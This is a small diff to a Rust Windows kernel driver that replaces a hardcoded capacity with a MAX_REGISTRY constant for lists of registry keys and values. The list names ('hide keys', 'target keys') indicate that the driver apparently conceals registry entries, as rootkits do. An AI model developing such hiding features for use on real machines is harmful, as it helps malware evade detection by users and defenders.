@@ -3,7 +3,7 @@ extern crate alloc;
 use {
     alloc::{string::{String, ToString}, vec::Vec}, 
     core::marker::PhantomData, 
-    shared::structs::TargetRegistry, 
+    shared::{structs::TargetRegistry, vars::MAX_REGISTRY}, 
     spin::{lazy::Lazy, Mutex, MutexGuard}, 
     utils::KeyListType, 
     wdk_sys::{NTSTATUS, STATUS_DUPLICATE_OBJECTID, STATUS_SUCCESS, STATUS_UNSUCCESSFUL}
@@ -17,16 +17,16 @@ pub mod ioctls;
 pub use callback::*;
 
 /// List of keys and target values.
-pub static TARGET_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
+pub static TARGET_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));
 
 /// List of target keys.
-static TARGET_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
+static TARGET_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));
 
 /// List of hide keys.
-static HIDE_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
+static HIDE_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));
 
 /// List of keys and target values.
-static HIDE_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
+static HIDE_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_REGISTRY)));
 
 /// Trait defining common operations for registry lists.
 trait RegistryList<T> {
